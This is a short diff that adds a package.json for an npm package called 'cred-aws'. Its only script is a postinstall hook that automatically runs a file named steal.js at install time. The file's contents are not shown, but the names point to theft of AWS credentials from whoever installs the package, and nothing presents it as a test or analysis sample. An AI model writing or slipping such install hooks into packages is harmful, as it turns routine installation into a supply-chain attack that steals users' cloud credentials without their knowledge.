@@ -1,0 +1,7 @@
+{
+  "name": "cred-aws",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
